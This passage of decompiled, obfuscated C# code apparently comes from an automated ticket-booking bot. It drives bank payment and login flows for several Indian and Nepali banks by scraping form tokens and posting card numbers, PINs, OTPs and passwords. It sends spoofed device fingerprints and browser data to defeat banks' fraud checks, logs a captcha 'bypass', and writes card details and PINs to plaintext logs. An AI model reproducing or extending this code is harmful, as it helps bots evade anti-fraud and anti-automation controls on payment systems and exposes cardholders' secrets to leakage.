                    text = "otp=&pass=&submitted=1&authType=Visa+Password&cancelHit=0&forgotPassword=0&cardHolder=&Userid=&authDefaultSelect=Visa+Password&AuthFallBack=&Phase=passwd&tryIndex=1&pin=otp%3D011706&TermUrl=&ARCOTC=&ARCOTR=&Locale=GenericOTP_SBI_Visa%2F&RFIncreaseAuthAction=0&RFIsSecAuthPresentForIncreaseAuth=0&CookieType=0&VSDCInput=&VSDCData=&ChipPluginName=&ChipPluginVersion=&ChipPluginPresent=TRUE&eAccessPresent=FALSE&eAccessRequired=FALSE&ChipSecret=&AcsCookie=&DeviceID=&ABSlog=GPP&deviceDNA=&executionTime=&dnaError=&mesc=&mescIterationCount=0&desc=&isDNADone=false&arcotFlashCookie=&pan=&PaReq=&MD=&CustData=";
                    text = clsPostData.SetPost(text, "TermUrl", HttpUtility.UrlEncode(text2));
                    string text7 = text3.Substring(text3.IndexOf("acsCookie") + 10);
                    text7 = text7.Substring(0, text7.IndexOf("&") - 1);
                    text = clsPostData.SetPost(text, "AcsCookie", HttpUtility.UrlEncode(text7));
                    string text8 = text3.Substring(text3.IndexOf("Input") + 6);
                    text8 = text8.Substring(0, text8.IndexOf("&") - 1);
                    text = clsPostData.SetPost(text, "vsdcInput", HttpUtility.UrlEncode(text8));
                    string text9 = text3.Substring(text3.IndexOf("userPan") + 8);
                    text9 = text9.Substring(0, text9.IndexOf("&") - 1);
                    text = clsPostData.SetPost(text, "pan", HttpUtility.UrlEncode(text9));
                    string text10 = string_92.Substring(string_92.IndexOf("PaReq") + 14);
                    text10 = text10.Substring(0, text10.IndexOf("\""));
                    text = clsPostData.SetPost(text, "PaReq", HttpUtility.UrlEncode(text10));
                    string text11 = string_92.Substring(string_92.IndexOf("name=\"MD") + 17);
                    text11 = text11.Substring(0, text11.IndexOf("\""));
                    text = clsPostData.SetPost(text, "MD", HttpUtility.UrlEncode(text11));
                    string text12 = text3.Substring(text3.IndexOf("deviceId") + 9);
                    text12 = text12.Substring(0, text12.IndexOf("&") - 1);
                    text = clsPostData.SetPost(text, "DeviceID", HttpUtility.UrlEncode(text12));
                    string string_93 = "";
                    if (!method_163("Enter SBI OTP For:.", ref string_93, ref clsMain.string_59))
                    {
                        break;
                    }
                    text = clsPostData.SetPost(text, "otp", string_93);
                    text = clsPostData.SetPost(text, "pin", "otp%3D" + string_93);
                    string_90 = string_87;
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. SBI_CC(2/2)", tCntrlName_, null, null);
                    }
                    _Request(string_90, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0);
                    if (!string_92.Contains(" <title id=\"titletext\"></title>"))
                    {
                        clsMain.Lock("Success ProcessHdfcCC");
                        if (string_92.Contains("submit\" value=\"Continue..."))
                        {
                            string_92 = (string_86 = string_92.Substring(string_92.IndexOf("</FORM>") + 7));
                            string_87 = string_90;
                            return true;
                        }
                        return false;
                    }
                }
                return false;
            }
            catch (Exception ex2)
            {
                clsMain.method_74("Process_RazorPay", ex2.Message);
            }
            return false;
        }

        private bool method_179(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = "";
            string string_92 = string_86;
            clsMain.Lock("Enter ProcessFedral_DC,CC.");
            string text = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_93 = "";
            clsMain.Lock("First Hit URL = " + string_90 + " Inp = " + text);
            if (!_Request(string_90, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
            {
                string text2 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + text2);
                return false;
            }
            clsMain.Lock("First Hit Output = " + string_93);
            string text3 = Class12.smethod_16(string_88, false);
            string text4 = clsPostData.smethod_7("", string_93, "input", "key");
            string text5 = Class12.smethod_16(text3 + text4.Substring(text4.IndexOf("||") + 2), false);
            bool flag = string_93.IndexOf("Merchant Details", StringComparison.CurrentCultureIgnoreCase) <= 0;
            bool result = false;
            if (flag)
            {
                string_89 = "Error Occured while Making Payment!";
                string text6 = string_89;
                string text7 = ", Check HTML";
                string string_94 = text6 + text7;
                clsMain.Lock(string_94);
                result = false;
            }
            else
            {
                string_87 = string_90;
                string_90 = "https://acs9-fd.enstage-sas.com/acs-v1/validateStaticPassword?page=authPage";
                text = "password=" + text5 + "&hash=" + text3 + "&otp=&key=" + text4;
                clsMain.Lock("Second Hit URL = " + string_90 + " Inp = " + string_93);
                if (!_Request(string_90, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
                {
                    string_89 = "Failed after Payment, Check Status.";
                    string text8 = "Second Hit Failed. err = ";
                    string text9 = string_91;
                    string string_95 = text8 + text9;
                    clsMain.Lock(string_95);
                    result = false;
                }
                else
                {
                    clsMain.Lock("Second Hit Output = " + string_92);
                    if (string_92.IndexOf("Your transaction is being processed, Please wait", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        string string_96 = "Success ProcessAirtelCC";
                        clsMain.Lock(string_96);
                        string_86 = string_92;
                        string_89 = string_90;
                        result = true;
                    }
                }
            }
            return result;
        }

        internal bool method_180(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessIOBDebit.");
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "IOB Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("paymentId"))
                    {
                        string text7 = "ECB";
                        int startIndex = string_94.IndexOf("function encrypData");
                        startIndex = string_94.IndexOf("var paymentId", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("var encCaptcha");
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("CSRFToken", startIndex);
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text10 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("name=\"paymentId\"", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchWeb", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text12 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        clsMain.Lock("paymentIdKey: " + text8);
                        clsMain.Lock("Get Encrypted Data, inp = " + text8 + "||" + text7 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                        text = Class12.smethod_17(text, text8);
                        text2 = Class12.smethod_17(text2, text8);
                        text5 = Class12.smethod_17(text5, text8);
                        string text13 = Class12.smethod_17(text3, text8);
                        string text14 = Class12.smethod_17(text4, text8);
                        clsMain.Lock("Loading Captcha");
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for IOB Debit.", tCntrlName_, null, null);
                        }
                        clsMain.Lock("Loading Captcha, Not required, Bypassed");
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for IOB Debit.", tCntrlName_, null, null);
                        }
                        string text15 = "BE1D5";
                        string text16 = DateTime.Now.ToString("ddd MMM dd HH:mm:ss IST yyyy");
                        string string_95 = text8 + text9 + text + text2 + "A" + text5 + text15 + "0" + text16 + text11 + "file:////fss50/axisbank/Config/ipay/instupd/15/INSTITUTION/CSS/style.css/fss50/axisbank/Config/ipay/instupd/15/INSTITUTION/Header/IOB.jpg//fss50//axisbank//Config//ipay//brands//default//label.propertiesIRCTChttps://www.irctc.co.in" + text12 + "01000" + 0 + "Indian Overseas Bankhttps://www.irctc.co.in/eticketing/BankResponse005000049015500004900" + text13 + "D" + text14 + "//fss50//PGWAYC//config////brands//default///footer.html";
                        string string_96 = Class12.smethod_22(text10).ToString().ToUpper();
                        string text17 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                        text17 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI%3D";
                        text6 = "paymentIdKey=" + text8 + "&hdndivType=&encCaptcha=" + text9.Replace("=", "%3D") + "&cspg=" + text17.Replace("^", "%5E") + "&CSRFToken=" + text10 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text15 + "&gstnTXNId=&gstnFlag=0&paymentInitTime=" + HttpUtility.UrlEncode(text16) + "&paymentId=" + text11 + "&styleCss=file%3A%2F%2F%2F%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F15%2FINSTITUTION%2FCSS%2Fstyle.css&headerFile=%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F15%2FINSTITUTION%2FHeader%2FIOB.jpg&labelFile=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Fbrands%2F%2Fdefault%2F%2Flabel.properties&mrchName=IRCTC&mrchWeb=https%3A%2F%2Fwww.irctc.co.in&mrchTrackId=" + text12 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=0&ecomFlg=0&captchaFlg=" + 0 + "&instName=Indian+Overseas+Bank&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=50000490&instId=15&mrchId=5000049&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text13 + "&creditDebitCheck=D&debitYear=" + text14 + "&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2F%2Ffss50%2F%2FPGWAYC%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2F%2Ffooter.html";
                        string_91 = "https://securepayments.fssnet.co.in/pgwayc/paymentpage.htm";
                        string_92 = "https://securepayments.fssnet.co.in/pgwayc/paymentrouter.htm";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Second Hit output = " + string_94);
                        if (!string_94.Contains("Please wait your Transaction is getting processed"))
                        {
                            string_90 = "Failed while providing Debit Card Details.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        startIndex = string_94.IndexOf("result=") + 7;
                        length = string_94.IndexOf("&", startIndex) - startIndex;
                        int num = (string_94.Substring(startIndex, length).ToUpper().Contains("NOT") ? 1 : 0);
                        if (num != 0)
                        {
                            clsMain.Lock("Payment Failed");
                            string_90 = "Invalid Card Details, Payment Failed!";
                            return false;
                        }
                        clsMain.Lock("Success ProcessIOBDebit isPaymentFailed = " + num);
                        string_89 = string_94;
                        string_90 = string_92;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessIOBDebit", ex.Message);
                    result = false;
                }
                finally
                {
                    bool_27 = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with IOB Payment";
            clsMain.Lock("Html doesn't contains fssnet.co.in, returning.");
            return false;
        }

        internal bool method_181(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessSBINepal.");
            if (string_86.Contains("onlinesbiglobal"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string string_92 = "";
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_93 = "";
                string string_94 = "";
                try
                {
                    if (!string.IsNullOrEmpty(string_86.Trim()) && string_86.Contains("onlinesbiglobal"))
                    {
                        string text4 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                        clsMain.Lock("First Hit Inp = " + text4);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_94);
                        string text5 = method_182(string_94);
                        string text6 = "https://www.onlinesbiglobal.com/NPINB/";
                        int startIndex = string_94.IndexOf("<form", StringComparison.CurrentCultureIgnoreCase);
                        startIndex = string_94.IndexOf("ACTION", startIndex, StringComparison.CurrentCultureIgnoreCase);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text7 = string_94.Substring(startIndex, length);
                        string_91 = string_92;
                        string_92 = text6 + text7;
                        string text8 = string_94.Substring(string_94.IndexOf("QS") + 11);
                        text8 = text8.Substring(0, text8.IndexOf("\""));
                        text8 = text8.Replace("&#126;", "%7E");
                        text8 = text8.Replace("|", "%7C");
                        text4 = "AuthenticationFG.USER_PRINCIPAL=" + text + "&AuthenticationFG.VERIFICATION_CODE=" + text5 + "&Action.STU_VALIDATE_CREDENTIALS=Login&AuthenticationFG.MENU_ID=3&FG_BUTTONS__=VALIDATE_CREDENTIALS%2CSTU_VALIDATE_CREDENTIALS%2CVALIDATE_CREDENTIALS_DIG_CERT%2CBACK%2CCLEAR_VALUES&AuthenticationFG.IS_FIRST_AUTHENTICATION=Y&QS=" + text8 + "&USER_ID_COOKIE=&CATEGORY_ID=VIV&AuthenticationFG.PREFERRED_LANGUAGE=001&userType=1&bankId=NSBL&languageId=001&FORMSGROUP_ID__=AuthenticationFG&AuthenticationFG.REPORTTITLE=AuthenticationScreen&RIA_TARGETS=null&JS_ENABLED_FLAG=Y&DECRYPT_FLAG=N&CHECKBOX_NAMES__=&Requestid=1";
                        clsMain.Lock("Second Hit Inp = " + text4);
                        clsMain.Lock("Url=" + string_92 + "     referer=" + string_91);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_94);
                        startIndex = string_94.IndexOf("<FORM", StringComparison.CurrentCultureIgnoreCase);
                        startIndex = string_94.IndexOf("ACTION", startIndex, StringComparison.CurrentCultureIgnoreCase);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        text7 = string_94.Substring(startIndex, length);
                        string_91 = string_92;
                        string_92 = text6 + text7;
                        string text9 = "10001,bfcdda5d580fbcb9c1ff9bf16553cb043336f4e6be0d1b81969ddec948512aa3f02e2f285661cdc0435205ed8c23fd189505344a58a9069e0e8c4ada070dcf9cddabee07fb08c46636bddfa8aa3d32183508ef179f52f4e153b54b73437baf6ec1ef6fd8542eebd551a794c0813489043bcdc0a0cf14f35fd323e9d1f39ac34b,131";
                        text9 = string_94.Substring(string_94.IndexOf("'__JS_ENCRYPT_KEY__' value='") + 28);
                        text9 = HttpUtility.UrlDecode(text9.Substring(0, text9.IndexOf("'")));
                        string text10 = "";
                        string text11 = "UNION1";
                        updateTStatus_2?.Invoke(1005, text11 + "||" + text2 + "||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj = new object();
                            object obj2 = obj;
                            lock (obj2)
                            {
                                text10 = clsMain.dictionary_5[text11];
                                method_61("Encrypted Data, out = " + text10);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        text4 = "buffer=&AuthenticationFG.ACCESS_CODE=" + text10 + "&MIN_LENGTH_OF_PASSWORD=6&PWD_SPECIAL_CHAR_MANDATORY=Y&PWDDIGITMAND=Y&PASSWORD_STRENGTH=Too+short%7CWeak%7CFair%7CStrong%7CVery+Strong&IMAGE_PATH=L001%2Fconsumer%2Fimages&Action.VALIDATE_STU_CREDENTIALS_UX=Login&CAMFP=%7B%22VERSION%22%3A%222.1.2%22%2C%22MFP%22%3A%7B%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F84.0.4147.105+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%2220030107%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22IEPlugins%22%3A%7B%7D%2C%22NetscapePlugins%22%3A%7B%22Chrome+PDF+Plugin%22%3A%22%22%2C%22Chrome+PDF+Viewer%22%3A%22%22%2C%22Native+Client%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A864%2C%22AvlHeight%22%3A834%2C%22FullWidth%22%3A1536%2C%22AvlWidth%22%3A1536%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%7D%2C%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22systemLanguage%22%3A%22en-US%22%2C%22Timezone%22%3A-330%7D%7D%2C%22ExternalIP%22%3A%2210.189.254.114%22%2C%22MESC%22%3A%7B%22mesc%22%3A%22mi%3D2%3Bcd%3D150%3Bid%3D30%3Bmesc%3D569752%3Bmesc%3D516315%22%7D%7D&IPADDRESS=10.189.254.114&CALLERID=RetailEbanking&DEVICEID=&DEVICEDNA=%7B%22VERSION%22%3A%222.1.2%22%2C%22MFP%22%3A%7B%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F84.0.4147.105+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%2220030107%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22IEPlugins%22%3A%7B%7D%2C%22NetscapePlugins%22%3A%7B%22Chrome+PDF+Plugin%22%3A%22%22%2C%22Chrome+PDF+Viewer%22%3A%22%22%2C%22Native+Client%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A864%2C%22AvlHeight%22%3A834%2C%22FullWidth%22%3A1536%2C%22AvlWidth%22%3A1536%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%7D%2C%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22systemLanguage%22%3A%22en-US%22%2C%22Timezone%22%3A-330%7D%7D%2C%22ExternalIP%22%3A%2210.189.254.114%22%2C%22MESC%22%3A%7B%22mesc%22%3A%22mi%3D2%3Bcd%3D150%3Bid%3D30%3Bmesc%3D569752%3Bmesc%3D516315%22%7D%7D&EXECUTIONTIME=332&FG_BUTTONS__=VALIDATE_CREDENTIALS%2CVALIDATE_CREDENTIALS_DIG_CERT%2CBACK%2CCLEAR_VALUES&AuthenticationFG.IS_FIRST_AUTHENTICATION=Y&QS=" + text8 + "&CATEGORY_ID=VIV&AuthenticationFG.PREFERRED_LANGUAGE=001&userType=1&bankId=NSBL&languageId=001&FORMSGROUP_ID__=AuthenticationFG&AuthenticationFG.REPORTTITLE=AuthenticationImagePhraseScreen&RIA_TARGETS=null&JS_ENABLED_FLAG=Y&DECRYPT_FLAG=Y&CHECKBOX_NAMES__=&Requestid=2&__JS_ENCRYPT_KEY__=&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A864%2C%22AvlHeight%22%3A834%2C%22FullWidth%22%3A1536%2C%22AvlWidth%22%3A1536%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F84.0.4147.105+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D746373%3Bldi%3D212%3Bmesc%3D689918%3Bldi%3D227%22%2C%22DESC%22%3A%22%22%7D&executionTime=1453&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D746373%3Bldi%3D212%3Bmesc%3D689918%3Bldi%3D227&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=&DEVICE_ID=null&DEVICE_TYPE=DEVICEID.HTTP&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A864%2C%22AvlHeight%22%3A834%2C%22FullWidth%22%3A1536%2C%22AvlWidth%22%3A1536%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F84.0.4147.105+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D746373%3Bldi%3D212%3Bmesc%3D689918%3Bldi%3D227%22%2C%22DESC%22%3A%22%22%7D";
                        Int32_0 = 1;
                        clsMain.Lock("Url=" + string_92 + "     referer=" + string_91);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        string_91 = string_92;
                        string text12 = string_94.Substring(string_94.IndexOf("FinacleRiaRequest"));
                        string_92 = text6 + text12.Substring(0, text12.IndexOf("\""));
                        text4 = string.Concat("criteria={\"WID_CONF\":\"PageConfigurationMaster_3W__1\",\"PARENT_MENU_FOR_REMOVE\":\"3\",\"GROUPLETS_IN_PAGE\":\"%2CPageConfigurationMaster_3W__1\"}&target=PageConfigurationMaster_3W__1&requestId=0");
                        Int32_0 = 2;
                        String_0 = "0";
                        clsMain.Lock("Url=" + string_92 + "     referer=" + string_91);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "SBI Nepal NB Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        string_91 = string_92;
                        text12 = string_94.Substring(string_94.IndexOf("FinacleRiaRequest"));
                        text12 = text6 + text12.Substring(0, text12.IndexOf("\""));
                        String_0 = string_94.Substring(string_94.IndexOf("Requestid") + 18);
                        String_0 = String_0.Substring(0, String_0.IndexOf("\""));
                        string text13 = string_94.Substring(string_94.IndexOf("#40;NPR&#41") + 16);
                        text13 = text13.Substring(0, text13.IndexOf("\""));
                        text4 = string.Concat(new string[3] { "TranRequestManagerFG.INITOR_ACCOUNT=", text13, "&errorForConntrolIds=Transaction+Reference+Name%3DTranRequestManagerFG.TXN_REF_NAME%40%40Frequency+Type%3DTranRequestManagerFG.FREQ_TYPE%40%40Frequency%3DTranRequestManagerFG.REC_FREQ%40%40Recurring+Date%3DTranRequestManagerFG.TXN_DATE%40%40Transaction+Date%7C%7CLC1146%3DTranRequestManagerFG.TXN_DATE%40%40Effective+Date%7C%7CLC12832%3DTranRequestManagerFG.TXN_DATE%40%40Next+Installment+Date%3DTranRequestManagerFG.TXN_DATE%40%40Number+Of+Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Total+Number+Of+Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Pending+Installments%3DTranRequestManagerFG.PEN_NO_INST%40%40End+Date%3DTranRequestManagerFG.END_DATE%40%40Validity+Indicator%3DTranRequestManagerFG.VAL_IND%40%40Marked+for+Stop%3DTranRequestManagerFG.MARKED_FOR_STOP_STATUS%40%40First+Payment+Date%3DTranRequestManagerFG.FIRST_PMT_DATE%40%40First+Payment+Amount%3DTranRequestManagerFG.FIRST_PMT_AMT%40%40Last+Payment+Amount%3DTranRequestManagerFG.LAST_PMT_AMT%40%40Originator+ID%3DTranRequestManagerFG.ORIGINATOR_ID_COMPANY_ID%40%40Initiator+Account%3DTranRequestManagerFG.INITOR_ACCOUNT_BATCH%40%40Originator+Remarks%3DTranRequestManagerFG.ORIGINATOR_REMARKS%40%40Descriptive+Date%3DTranRequestManagerFG